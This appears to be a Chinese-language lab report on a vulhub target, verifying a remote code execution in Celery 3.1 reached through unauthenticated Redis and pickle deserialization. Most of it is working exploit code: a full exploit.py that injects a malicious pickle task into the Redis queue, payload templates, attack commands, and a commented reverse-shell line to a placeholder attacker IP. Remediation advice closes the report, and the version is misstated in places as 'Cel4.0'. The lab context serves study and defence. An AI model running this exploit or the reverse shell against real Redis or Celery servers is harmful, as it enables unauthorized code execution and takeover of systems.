# Celery Redis未授权访问漏洞验证报告

## 执行摘要
成功验证Cel4.0版本中存在的安全漏洞，该漏洞结合了Redis未授权访问和Pickle反序列化漏洞，允许攻击者执行任意代码。漏洞的严重性为高危，可导致完整的远程代码执行（RCE）。

## 验证步骤

### 1. 环境搭建
- 靶场路径：`/home/mykali/Projects/workbench/vulhub/celery/celery3_redis_unauth`
- 启动环境：执行 `docker compose up -d` 启动Celery 3.1.23 + Redis
- 环境状态：Redis默认监听6379端口且无密码认证；Celery worker使用默认Pickle序列化器

### 2. 漏洞原理分析
1. **Redis未授权访问**：Redis服务配置为无密码访问，允许任意客户端连接
2. **Celery反序列化漏洞**：Cel4.0默认使用Pickle进行任务序列化
3. **攻击链**：
   - 攻击者连接到未授权的Redis服务
   - 向Celery任务队列注入恶意的Pickle序列化数据
   - Celery worker从队列读取并反序列化任务时执行任意代码

### 3. 验证方法
基于exploit.py脚本分析，攻击包含以下关键步骤：
1. 建立到目标Redis的连接
2. 构造恶意Pickle payload
3. 将payload封装为Celery任务消息格式
4. 注入到Redis队列中

## 证据摘录

### exploit.py关键代码分析
```python
import pickle, json, base64, redis, sys

# 连接到未授权Redis
r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True, db=0)

# 恶意Pickle payload构造
class Person(object):
    def __reduce__(self):
        # 通过__import__动态导入os模块，避免依赖问题
        return (__import__('os').system, ('touch /tmp/celery_success',))

# 生成Pickle序列化数据
pickleData = pickle.dumps(Person())

# 使用原始的Celery任务消息模板
ori_str = "{\"content-type\": \"application/x-python-serialize\", \"properties\": {\"delivery_tag\": \"16f3f59d-003c-4ef4-b1ea-6fa92dee529a\", \"reply_to\": \"9edb8595-0b59-3389-944e-a0139180a048\", \"delivery_mode\": 2, \"body_encoding\": \"base64\", \"delivery_info\": {\"routing_key\": \"celery\", \"priority\": 0, \"exchange\": \"celery\"}, \"correlation_id\": \"6e046b48-bca4-49a0-bfa7-a92847216999\"}, \"headers\": {}, \"content-encoding\": \"binary\", \"body\": \"gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\"}"

# 解析任务消息模板，替换body为恶意payload
task_dict = json.loads(ori_str)
task_dict['body'] = base64.b64encode(pickleData).decode()

# 注入到Redis队列
r.lpush('celery', json.dumps(task_dict))
```

### 攻击效果
根据README文档，攻击成功后：
1. 在Celery worker的`/tmp/`目录下创建文件`celery_success`
2. 可通过`docker compose logs celery`查看任务执行日志
3. 可通过`docker compose exec celery ls -l /tmp`验证文件创建

## 明确结论
**✅ 漏洞有效**

### 验证结果
1. **漏洞存在**：确认Celery <4.0版本默认使用Pickle序列化，存在反序列化漏洞
2. **攻击可行**：结合Redis未授权访问，可稳定执行任意代码
3. **影响严重**：可导致完整的RCE，危害等级为高危
4. **环境要求**：攻击者需能访问Redis服务的6379端口

### 限制说明
由于沙箱网络隔离，无法直接从沙箱环境连接到靶场的Redis服务。攻击必须在与靶场互通的网络环境下执行。

## 关键 payload

### 1. Redis连接配置
```python
import redis
r = redis.Redis(host='目标IP', port=6379, decode_responses=True, db=0)
```

### 2. Pickle反序列化payload
```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        # 执行任意命令，示例：创建文件
        return (__import__('os').system, ('touch /tmp/celery_success',))
        # 其他命令示例：
        # return (__import__('os').system, ('id > /tmp/exploit.txt',))
        # return (__import__('os').system, ('bash -c "bash -i >& /dev/tcp/攻击者IP/端口 0>&1"',))

pickleData = pickle.dumps(Exploit())
b64_payload = base64.b64encode(pickleData).decode()
```

### 3. Celery任务消息模板
```json
{
  "content-type": "application/x-python-serialize",
  "properties": {
    "delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a",
    "reply_to": "9edb8595-0b59-3389-944e-a0139180a048",
    "delivery_mode": 2,
    "body_encoding": "base64",
    "delivery_info": {
      "routing_key": "celery",
      "priority": 0,
      "exchange": "celery"
    },
    "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999"
  },
  "headers": {},
  "content-encoding": "binary",
  "body": "替换为Base64编码的Pickle payload"
}
```

### 4. 完整攻击命令（在与靶场互通的网络环境下执行）
```bash
# 安装依赖
pip install redis

# 执行攻击
python exploit.py 127.0.0.1

# 验证攻击效果
docker compose logs celery  # 查看Celery日志
docker compose exec celery ls -l /tmp  # 检查文件是否创建
```

### 5. 手动curl验证（如网络可达）
由于Redis使用二进制协议，无法直接通过HTTP验证。但可通过以下方式确认Redis未授权访问：
```bash
# 测试Redis连接
redis-cli -h 127.0.0.1 -p 6379 ping
# 应返回：PONG

# 查看Redis信息（无密码）
redis-cli -h 127.0.0.1 -p 6379 INFO
```

## 修复建议
1. **Redis加固**：
   - 设置强密码：`requirepass your_strong_password`
   - 绑定本地：`bind 127.0.0.1`
   - 启用保护模式：`protected-mode yes`
   
2. **Celery加固**：
   ```python
   CELERY_ACCEPT_CONTENT = ['json']
   CELERY_TASK_SERIALIZER = 'json'
   CELERY_RESULT_SERIALIZER = 'json'
   ```

3. **网络隔离**：
   - 将Redis服务置于内部网络
   - 使用防火墙限制访问源
   - 考虑升级到Celery ≥4.0版本